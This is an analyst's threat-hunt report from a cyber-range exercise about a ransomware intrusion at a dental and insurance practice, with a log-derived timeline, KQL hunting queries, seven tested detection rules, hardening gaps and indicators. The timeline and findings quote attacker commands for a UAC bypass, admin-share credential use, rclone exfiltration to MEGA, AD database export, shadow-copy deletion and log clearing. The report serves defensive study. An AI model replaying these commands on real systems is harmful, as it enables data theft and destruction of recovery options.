# Threat Hunt Report: Hunt 22 "Harborlight" (HL-INC-2026-0204)

A [Cyber Range](https://www.skool.com/cyber-range) live community threat hunt (Hunt 22, "Harborlight"): a ransomware
intrusion at a dental and insurance practice, traced from one phishing download on a front-office workstation to the file
server and the domain controller, from Sysmon and Windows Security logs with KQL in Microsoft Defender Advanced Hunting.
All 46 flags, finished on time. Published after the hunt closed on 13 October 2026. A PDF copy of this report is in the
repo: [Hunt22-Harborlight-Report.pdf](Hunt22-Harborlight-Report.pdf).

**Analyst:** Ken Kariuki · **Date:** 3 October 2026 · **Result:** 46 of 46 flags, 4,060 / 4,190 points, completed on time (live hunt, first finisher on the scoreboard at completion)  
**Client:** Harborlight Dental & Insurance (MSP: Coastal MSP, no SOC, no alert queue)  
**Telemetry:** `HarborlightDental_CL` in workspace `LAW-SilentCorridor` (Sysmon and Windows Security, 44,989 rows), queried from Microsoft Defender Advanced Hunting  
**Hosts:** BACKOFFICE-PC1 (172.16.0.109, workstation, user Emily.Grant) · HL-FS01 (172.16.0.8, file server) · ADDC01 (172.16.0.7, domain controller)  
**Window:** 2026-02-04 01:57 to 18:47 UTC (all times below are UTC; the portal displays Pacific time, so 01:57 UTC shows as 3 Feb 5:57 PM)  
**Version 2** (3 October, evening): adds confidence labels (section 5), seven detection rules tested against this dataset (section 7) and the change that closes each gap (section 8).

## 1. Summary

A front-office user, Emily Grant, downloaded **`Vendor_Invoice_Review.7z`** in Edge at 01:57 UTC on 4 February 2026. She
installed 7-Zip to open it, and the ISO inside carried **`review.dll`**, which ran through `rundll32.exe`. A second lure,
`Harborlight_Insurance_Claims.7z`, re-ran the same DLL 25 minutes later, and from that moment the implant beaconed to
**`cdn.cloud-endpoint.net`**, a hostname fronted by Cloudflare.

From one workstation the attacker took the whole estate in about three and a half hours. They bypassed UAC with
`fodhelper.exe`, injected into `spoolsv.exe` to run as SYSTEM, read LSASS memory, and used **Emily.Grant's own password**
to reach the file server and then the domain controller over admin shares. On the file server they copied `C:\Shares` to a
MEGA account with a renamed copy of rclone. On the domain controller they copied the Active Directory database with
`ntdsutil`. They deleted shadow copies, the backup catalog and boot recovery on the file server, ran the **Akira**
ransomware binary `updater.exe` on all three hosts between 05:13 and 05:17, wiped sixteen event-log channels per host, and
then created a new domain admin account, **`svc_sql`**.

**The incident did not end with the ransom note.** Three backdoors kept beaconing for hours afterwards: the workstation
until 09:23, the file server until 14:47 and the domain controller until **18:47**, more than thirteen hours after the
encryption. The stolen data, the AD database and the `svc_sql` account all remain in the attacker's hands.

## 2. Timeline

| UTC | Host | Event |
|---|---|---|
| **01:57:15** | PC1 | Edge downloads `C:\Users\emily.grant\Downloads\Vendor_Invoice_Review.7z` |
| 01:58:13 – 01:58:20 | PC1 | Edge downloads `7z2501-x64.exe`; 7-Zip installs |
| 01:59:02 | PC1 | 7-Zip extracts `Vendor_Invoice_Review.iso` |
| 01:59:15 | PC1 | `rundll32.exe D:\review.dll,StartW` (again at 01:59:32 and 02:00:08) |
| 02:24:21 – 02:24:52 | PC1 | Second lure `Harborlight_Insurance_Claims.7z` downloaded and extracted |
| 02:25:06 | PC1 | `cmd /c for %d in (D E F G H I J) do @if exist "%d:\review.dll" rundll32 %d:\review.dll,StartW` → runs from `E:` |
| 02:25:07 | PC1 | First C2: `rundll32.exe` resolves `cdn.cloud-endpoint.net` (104.21.30.237, 172.67.174.46) and connects |
| 02:32:48 | PC1 | `rundll32.exe` injects into `notepad.exe` (access 0x1fffff, remote thread); repeated to 02:35:45 |
| 02:40:15 | PC1 | `rundll32.exe` writes `C:\Users\Public\taskhostw.exe` |
| 02:40:41 – 02:42:08 | PC1 | `reg add HKCU\Software\Classes\ms-settings\shell\open\command` → `taskhostw.exe`, then `DelegateExecute` |
| 02:42:11 | PC1 | `fodhelper.exe` from `rundll32.exe`: Medium integrity, no elevation |
| **02:42:39** | PC1 | `cmd /c fodhelper.exe`: **High** integrity; `taskhostw.exe` starts elevated at 02:42:40 |
| 02:47:11 | PC1 | `taskhostw.exe` injects into `spoolsv.exe` (SYSTEM) |
| 02:56:31 – 02:59:36 | PC1 | `spoolsv.exe` injects into `notepad.exe`; it resolves every host name and sweeps port 445 across the subnet; writes `C:\Users\Public\20260203185934_recon.zip` |
| (after 02:47) | PC1 | `spoolsv.exe` opens `lsass.exe` with PROCESS_ALL_ACCESS (0x1fffff) |
| 03:33:38 – 03:34:14 | PC1 → FS01 | `net use Z: \\172.16.0.8\C$ /user:HARBORLIGHT\Emily.Grant …`; `taskhostw.exe` copied to the file server |
| 03:35:11 | FS01 | `taskhostw.exe` starts beaconing |
| 03:41:54 / 03:42:07 | FS01 | Run key `SecurityHealth` and scheduled task `WindowsUpdate` (onstart, SYSTEM), both → `taskhostw.exe` |
| 03:42:36 | FS01 | First log wipe: `wevtutil cl` System, Security, Windows PowerShell |
| 03:57:31 – 03:58:22 | FS01 | rclone dropped as `C:\ProgramData\Microsoft\MsMpEng.exe`; `rclone.conf` written (MEGA, `jwilson.vhr@proton.me`) |
| **03:58:33** | FS01 | `MsMpEng.exe --config …\rclone.conf copy C:\Shares mega:HARBORLIGHT-exfil -q` (again at 04:00:14) |
| 04:03:50 | FS01 | `update.bat`: Defender and firewall off, backup and database services stopped |
| **04:04:05 – 04:04:07** | FS01 | Anti-recovery: `vssadmin delete shadows`, `wmic shadowcopy delete`, `bcdedit` (two settings), `wbadmin delete catalog` |
| 04:05:12 – 04:05:26 | FS01 | `update.bat` and the same anti-recovery set run a second time, 81 s later; `vssadmin list shadows` at 04:05:49 |
| 04:26:08 | FS01 | `taskhostw.exe` injects into `spoolsv.exe` |
| 04:28:22 – 04:28:52 | FS01 → DC | `net use Y: \\172.16.0.7\C$` with the same account; `taskhostw.exe` copied to the DC |
| **04:33:55** | DC | `ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds"` (again as SYSTEM at 04:35:35) |
| 04:34:12 | DC | `taskhostw.exe` injects into `spoolsv.exe` |
| 04:42:28 – 04:43:35 | DC | `wmic /node:… process call create "cmd /c vssadmin delete shadows /all /quiet"`; the DC's `WMIC.exe` connects down to FS01 and PC1 at 04:44 |
| 04:44:23 | DC | Second backdoor: `C:\Users\Public\OneDriveSync.exe` (copy on FS01 at 04:46:29) |
| 04:54:52 | FS01 | Third backdoor: `C:\ProgramData\Microsoft\wsync.exe` |
| **05:13:02 – 05:17:35** | all | `updater.exe` (Akira) runs: FS01 05:13, DC 05:14, PC1 05:17; `akira_readme.txt` dropped 128 times; 27 files renamed `.akira`; each run clears five logs |
| 05:18:21 – 05:20:00 | all | `defender.bat` clears sixteen log channels per host, including Sysmon: PC1 05:18:21, FS01 05:19:31, DC 05:20:00 |
| 05:21:56 | DC | `net user svc_sql … /add /domain` |
| 05:21:57 – 05:22:54 | DC | Four attempts to grant rights; `net localgroup Administrators svc_sql /add` and `Add-ADGroupMember 'Domain Admins'` are the well-formed ones |
| 05:23:02 / 05:23:28 | DC | `net user svc_sql /domain` (verification); `net user akira_svc /domain` (lookup only) |
| 09:23 / 14:47 / **18:47:29** | PC1 / FS01 / DC | Last C2 beacon from each host |
| 10:43:40 | PC1 | `AnyDesk.exe` appears and connects to AnyDesk relays (unclassified, see section 4) |

## 3. Findings by kill-chain stage

**Initial access and execution (T1566, T1204, T1218.011).** The lure was an archive holding an ISO, a packaging that
commonly keeps the files inside from carrying the browser's download mark. Emily had to install 7-Zip herself to open it. The payload was a DLL run by a
signed Windows binary: `rundll32.exe D:\review.dll,StartW`. The second lure carried no new malware. Its launcher searched
drive letters D to J for the same `review.dll` and ran it again, and the first C2 traffic follows that second run by one
second.

**Defence evasion by injection (T1055).** The implant moved into `notepad.exe` at 02:32:48, and later the elevated
`taskhostw.exe` moved into `spoolsv.exe`, the Print Spooler, which runs as SYSTEM. The same `taskhostw.exe` → `spoolsv.exe`
injection appears on all three hosts (02:47:11, 04:26:08, 04:34:12). From then on the commands on each host are issued by
the Print Spooler.

**Privilege escalation (T1548.002).** A `fodhelper.exe` UAC bypass: the per-user `ms-settings\shell\open\command` key was
pointed at `C:\Users\Public\taskhostw.exe`. The first launch stayed at Medium integrity. The second, through `cmd`, reached
High.

**Credential access (T1003.001, T1003.003).** `spoolsv.exe` opened `lsass.exe` with PROCESS_ALL_ACCESS (0x1fffff). The
first stolen credential used on the network was Emily.Grant's own, in clear text on a `net use` command line at 03:34:09.
On the domain controller, `ntdsutil` Install-From-Media wrote a full copy of the AD database to `C:\Windows\Temp\ntds`.

**Lateral movement (T1021.002, T1047).** Two hops over the `C$` admin share with the same account: workstation to file
server at 03:34, file server to domain controller at 04:28. The traffic is not one-way: at 04:42 the DC issued a WMI
remote-execution command and its `WMIC.exe` connected back down to both other hosts. The flat /24 network let a front-office
workstation reach both servers directly.

**Exfiltration (T1567.002).** rclone, renamed `MsMpEng.exe` in `C:\ProgramData\Microsoft`, copied `C:\Shares` to
`mega:HARBORLIGHT-exfil` under the account `jwilson.vhr@proton.me`. It ran at 03:58 and 04:00, between the first log wipe
and the later ones, so theft and anti-forensics overlapped. The renamed rclone resolved MEGA storage nodes
(`gfs…userstorage.mega.co.nz`) 39 times, so the transfer reached MEGA; Sysmon does not record how much was sent.

**Impact: anti-recovery (T1490).** The file server received all three techniques (shadow copies, boot recovery, backup
catalog), twice, 81 seconds apart. The domain controller received only `vssadmin delete shadows /all /quiet`.

**Persistence (T1547.001, T1053.005, T1136.002, T1098).** Three implant binaries, each named after a Windows or Microsoft
component: `taskhostw.exe` (all hosts, `C:\Users\Public`), `OneDriveSync.exe` (DC and file server) and `wsync.exe` (file
server). On the file server a Run key and a scheduled task restart `taskhostw.exe`. In the domain, the new account `svc_sql`
was added to local Administrators and Domain Admins.

**Command and control (T1071.001, T1090.004).** Every implant resolves `cdn.cloud-endpoint.net`, which returns Cloudflare
addresses, so the real server is hidden. The channel is persistent, split across ports 80 and 443, with hundreds to
thousands of connections per implant.

**Impact: encryption (T1486) and log clearing (T1070.001).** `updater.exe` dropped `akira_readme.txt` 128 times (77 on the
file server, 38 on the DC, 13 on the workstation) and renamed 27 distinct files to `.akira`. Security is the one channel
cleared in every wipe on every host. The sixteen-channel wipe ran on all three hosts, staggered by about 30 to 70 seconds.

## 4. Real or noise (judgement)

| Item | Verdict | Why |
|---|---|---|
| `taskhostw.exe` | Attack when the path is `C:\Users\Public` | The real one only runs from `C:\Windows\System32`; filter on the full path, not the name |
| 268 Credential Manager read events | Noise | The OS produces them all day, outside the attack window as well |
| `akira_svc` | Not real | The name is only queried (`net user akira_svc /domain`); nothing creates it |
| `OneDrive.exe` opening other processes | Noise | Routine behaviour of the genuine client under Emily's profile |
| First two `net group "Domain Admins"` attempts | Failed | The quoting was mangled, so `net1.exe` received the wrong group name |
| `AnyDesk.exe` on PC1 at 10:43 | Unclassified | It appears five hours after the encryption; it could be the attacker or Coastal MSP responding, and the telemetry does not say which |
| `RuntimeBroker.exe` in `C:\Users\Public` and `C:\ProgramData\Microsoft` on FS01 (03:25, 03:44) | Unresolved | Out-of-place copies of a Windows binary name that I did not trace further |

## 5. Confidence in the main conclusions

| Conclusion | Confidence | Basis, and what is missing |
|---|---|---|
| Initial access was the archive Emily downloaded and opened | High | Edge writes the archive to Downloads, 7-Zip is installed, `rundll32` runs `D:\review.dll` within two minutes |
| The ISO was used to avoid the browser's download mark | Medium | Known tradecraft; this telemetry does not show the mark on the extracted files |
| C2 is `cdn.cloud-endpoint.net` | High | 25 DNS lookups by four implant names on all three hosts, plus the connections |
| The real server is hidden behind Cloudflare | Medium | The name resolves to Cloudflare addresses; fronting cannot be told apart from ordinary proxying here |
| The UAC bypass worked on the second attempt | High | Integrity level is Medium on the first `fodhelper.exe`, High on the second |
| Credentials came from LSASS memory | Medium | The full-access open is logged; no dump file is seen, and other sources are not excluded |
| The attacker knew Emily.Grant's password | High | It is in clear text on the `net use` command line |
| `C:\Shares` left the network | High that the upload ran and reached MEGA; volume not determined | The command line twice, and 39 lookups of MEGA storage nodes by the renamed rclone |
| The AD database was copied | High on the host; not determined beyond it | `ntdsutil` wrote the copy to `C:\Windows\Temp\ntds`; no transfer of that folder is logged |
| The ransomware is Akira | Medium | Note name and file extension only; the binary was not analysed |
| `svc_sql` became a domain admin | Medium | Two well-formed commands ran after two malformed ones; no group-membership event was read, and logs were being cleared |
| The intrusion continued after encryption | High | Beacons to 09:23, 14:47 and 18:47 on the three hosts |

## 6. Key queries

All queries ran from the LAW-Cyber-Range workspace against the hunt's table. The portal's time picker filters on ingestion
time, so each query sets its own window on `TimeGenerated` and then works on `EventTime`.

```kql
// What landed in Downloads, and what wrote it (initial access)
workspace("LAW-SilentCorridor").HarborlightDental_CL
| where TimeGenerated > ago(1000d) and Computer has "BACKOFFICE-PC1" and EventID in ("11","15")
| extend T = column_ifexists("TargetFilename",""), Img = column_ifexists("Image","")
| where T has "Downloads"
| project EventTime, EventID, Img, T
| order by EventTime asc
```

```kql
// Process tree with integrity level (the fodhelper attempts)
workspace("LAW-SilentCorridor").HarborlightDental_CL
| where TimeGenerated > ago(1000d) and Computer has "BACKOFFICE-PC1" and EventID == "1"
| extend X = tostring(EventData_Xml)
| extend Img = extract("Image.>([^<]+)", 1, X), Cmd = extract("CommandLine.>([^<]+)", 1, X),
         IL = extract("IntegrityLevel.>([^<]+)", 1, X), Parent = extract("ParentImage.>([^<]+)", 1, X)
| where Img has_any ("fodhelper", "taskhostw", "reg.exe")
| project EventTime, Img, Cmd, IL, Parent
| order by EventTime asc
```

```kql
// Injection into the Print Spooler, per host
workspace("LAW-SilentCorridor").HarborlightDental_CL
| where TimeGenerated > ago(1000d) and EventID in ("8","10")
| extend X = tostring(EventData_Xml)
| extend Src = extract("SourceImage.>([^<]+)", 1, X), Tgt = extract("TargetImage.>([^<]+)", 1, X),
         Access = extract("GrantedAccess.>([^<]+)", 1, X)
| where Tgt has "spoolsv"
| summarize First = min(tostring(EventTime)), n = count() by Computer, EventID, Src, Access
```

```kql
// Beaconing: destination, port, volume and last-seen per implant
workspace("LAW-SilentCorridor").HarborlightDental_CL
| where TimeGenerated > ago(1000d) and EventID == "3"
| extend X = tostring(EventData_Xml)
| extend Img = extract("Image.>([^<]+)", 1, X), Dst = extract("DestinationIp.>([^<]+)", 1, X),
         Port = extract("DestinationPort.>([^<]+)", 1, X)
| where Img has_any ("Public", "ProgramData", "rundll32") and not(Dst startswith "172.16.")
| summarize First = min(tostring(EventTime)), Last = max(tostring(EventTime)), n = count() by Computer, Img, Dst, Port
```

```kql
// Ransom notes and encrypted files per host
workspace("LAW-SilentCorridor").HarborlightDental_CL
| where TimeGenerated > ago(1000d) and EventID == "11"
| extend F = extract("TargetFilename.>([^<]+)", 1, tostring(EventData_Xml))
| summarize Notes = countif(F has "akira_readme"), EncryptedFiles = dcountif(F, F endswith ".akira") by Computer
```

Method notes:

- `SystemTime` is blank on many rows and `TimeGenerated` is ingestion time, so every time in this report is `EventTime`.
- Host names carry the domain suffix (`BACKOFFICE-PC1.Harborlight.local`), so filters use `has`.
- Most Sysmon fields had to be read out of `EventData_Xml`; the flattened columns were empty for events 8 and 10.
- Hints used: two paid hints (15 points each) on answer wording, and one full reveal on the anti-recovery repeat flag,
  where the data and the hints agreed with my answer but the grader rejected it (reported to staff).

## 7. Detection rules (tested on this dataset)

Seven rules, run together as one query over `HarborlightDental_CL`. Every hit on this dataset is attack activity, so the
measured false-positive rate here is zero; the last column says where false positives would come from in production.

| Rule | Fires on | Hits here (hosts) | Expected false positives and tuning |
|---|---|---|---|
| R1 | `rundll32.exe` running a DLL from a drive other than C: | 4 (1) | Installers run from mounted media. Rare for front-office users; allow by signer if needed |
| R2 | `ms-settings\shell\open\command` written, by command line or registry event | 3 + 3 (1) | Close to none: nothing legitimate writes this per-user key |
| R3 | A program started from `C:\Users\Public` or `C:\ProgramData\Microsoft` | 7 (3) | Some vendor updaters live under ProgramData. Start in audit, then allow by signer; Defender's own folder is excluded |
| R4 | Remote thread into `spoolsv.exe` or `notepad.exe` | 13 (3) | Security and accessibility tools inject into user processes. Exclude signed vendor paths; never exclude a source in Public |
| R5 | `--config` + `copy` + a named remote (`name:path`) on one command line | 3 (1) | A genuine rclone backup job. Allow by host and account, not by file name, because the attacker renamed the tool |
| R6 | Account added to the domain or to an admin group from a command line | 13 (1) | Real provisioning by IT. Alert only outside change windows or from non-admin workstations, and confirm with the directory's own group-change events |
| R7 | DNS lookup by a program in Public, ProgramData or by `rundll32.exe` | 64 (3) | Vendor agents in ProgramData. Allow known signers; 39 of the hits here are the renamed rclone resolving MEGA, 25 are implants resolving the C2 name |

```kql
let T = workspace("LAW-SilentCorridor").HarborlightDental_CL | where TimeGenerated > ago(1000d) | extend X = tostring(EventData_Xml);
let P = T | where EventID == "1" | extend Img = extract("Image.>([^<]+)", 1, X), Cmd = extract("CommandLine.>([^<]+)", 1, X);
union
 (P | where Img endswith "rundll32.exe" and Cmd matches regex @"(?i)\s[d-z]:\\[^\\\s]+\.dll" | extend Rule = "R1", Detail = Cmd),
 (P | where Cmd has "ms-settings" and Cmd has "shell" and Cmd has "command" | extend Rule = "R2", Detail = Cmd),
 (T | where EventID in ("12", "13") | extend Obj = extract("TargetObject.>([^<]+)", 1, X) | where Obj has "ms-settings" and Obj has "command" | extend Rule = "R2", Detail = Obj),
 (P | where (Img contains "\\Users\\Public\\" or Img contains "\\ProgramData\\Microsoft\\") and Img !has "Windows Defender" | extend Rule = "R3", Detail = Img),
 (T | where EventID == "8" | extend Src = extract("SourceImage.>([^<]+)", 1, X), Tgt = extract("TargetImage.>([^<]+)", 1, X) | where Tgt has_any ("spoolsv.exe", "notepad.exe") | extend Rule = "R4", Detail = strcat(Src, " -> ", Tgt)),
 (P | where Cmd has "--config" and Cmd has "copy" and Cmd matches regex @"\s[A-Za-z0-9_-]{2,}:[A-Za-z0-9_-]" | extend Rule = "R5", Detail = Cmd),
 (P | where (Cmd has "/add" and Cmd has "/domain") or Cmd has "Add-ADGroupMember" or (Cmd has "localgroup" and Cmd has "Administrators" and Cmd has "/add") | extend Rule = "R6", Detail = Cmd),
 (T | where EventID == "22" | extend Img = extract("Image.>([^<]+)", 1, X), Qn = extract("QueryName.>([^<]+)", 1, X) | where (Img contains "\\Users\\Public\\" or Img contains "\\ProgramData\\" or Img endswith "rundll32.exe") and Qn !endswith ".local" and Qn has "." and Img !has "Windows Defender" | extend Rule = "R7", Detail = strcat(Img, " -> ", Qn))
| summarize Hits = count(), Hosts = dcount(Computer), Distinct = dcount(Detail) by Rule
```

Three more rules are needed and are described as logic only (not written or tested as queries here): a full-access
open of `lsass.exe` by a process that is not a known security product; a process created on another host over WMI by a
server; and any shadow-copy, backup-catalog, boot-recovery, AD-database-export or log-clearing command. Each of these
is high severity on its own.

## 8. Gaps, and the change that closes each

| Gap | Change that closes it | How to confirm it is closed |
|---|---|---|
| Logs were collected and nobody read them | Send Sysmon and Security logs to a monitored workspace; turn R1 to R7 and the three logic rules into alerts that page the MSP | Replay this dataset, or run a harmless DLL from a mounted ISO: R1 must raise an alert |
| A front-office user could mount an ISO and install software | Block ISO and IMG mounting, remove local admin rights, and block execution from mounted drives and `C:\Users\Public` with application control | A standard user cannot run a DLL from `D:` or an EXE from Public |
| `fodhelper.exe` elevated silently | UAC set to "Always notify"; front-office accounts are not local administrators | The same registry change no longer produces a High-integrity process |
| LSASS memory was readable | Enable LSASS protection (RunAsPPL) and Credential Guard | `lsass.exe` runs as a protected process; a full-access open is denied |
| A workstation could reach admin shares on both servers | Segment the network; block SMB and RPC from the workstation network to servers and the domain controller | A port test from PC1 to FS01 and ADDC01 on 445 and 135 fails |
| One user's password opened `C$` on a server and the DC | Remove user accounts from server administrators; separate admin accounts with MFA | `net use \\server\C$` as Emily.Grant is refused |
| Data could be sent to consumer cloud storage | Block MEGA and similar services at the firewall and in DNS | A lookup of a MEGA storage host from FS01 is blocked and logged |
| Backups and shadow copies could be deleted from the host | Keep an offline or immutable copy of `C:\Shares` and of the domain controller | A test restore from that copy succeeds |
| A new domain admin appeared without an alert | Forward directory group-change events; alert on R6 | Adding a test account to Domain Admins raises an alert within minutes |
| Logs were cleared on the hosts | Forward logs off the host as they are written, and alert on log-clear events | Clearing a test channel raises an alert and loses nothing centrally |

**Eradication, in this order.** Isolate all three hosts (they were still beaconing at 18:47). Disable and delete
`svc_sql`. Because the AD database was copied, reset every domain password and reset the `krbtgt` password twice. Remove
the implants, the Run key `SecurityHealth` and the scheduled task `WindowsUpdate`. Rebuild the domain controller from a
known-good backup taken before 4 February. Block `cdn.cloud-endpoint.net`.

**Notification.** `C:\Shares` on a dental and insurance practice's file server left the network at 03:58. Treat this as
a breach of patient and claims data and start the legal notification process.

## 9. Indicators

| Type | Value |
|---|---|
| C2 hostname | `cdn.cloud-endpoint.net` (Cloudflare 104.21.30.237, 172.67.174.46; ports 80 and 443) |
| Lures | `Vendor_Invoice_Review.7z` / `.iso`, `Harborlight_Insurance_Claims.7z` / `.iso`, `review.dll` (export `StartW`) |
| Implants | `C:\Users\Public\taskhostw.exe`, `C:\Users\Public\OneDriveSync.exe`, `C:\ProgramData\Microsoft\OneDriveSync.exe`, `C:\ProgramData\Microsoft\wsync.exe` |
| Exfiltration tool | `C:\ProgramData\Microsoft\MsMpEng.exe` (rclone), `C:\ProgramData\Microsoft\rclone.conf`, `config.dat` |
| Exfiltration target | `mega:HARBORLIGHT-exfil`, account `jwilson.vhr@proton.me` |
| Scripts | `C:\ProgramData\Microsoft\update.bat`, `C:\Users\Public\defender.bat` |
| Ransomware | `updater.exe` (`C:\Users\Public`, and `C:\ProgramData\Microsoft` on FS01), `akira_readme.txt`, extension `.akira` |
| Staging | `C:\Users\Public\20260203185934_recon.zip`, `C:\Windows\Temp\ntds` |
| Registry | `HKCU\Software\Classes\ms-settings\shell\open\command`; `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth` |
| Scheduled task | `WindowsUpdate` → `C:\Users\Public\taskhostw.exe` (onstart, SYSTEM) |
| Accounts | `Emily.Grant` (compromised), `svc_sql` (attacker-created domain admin) |
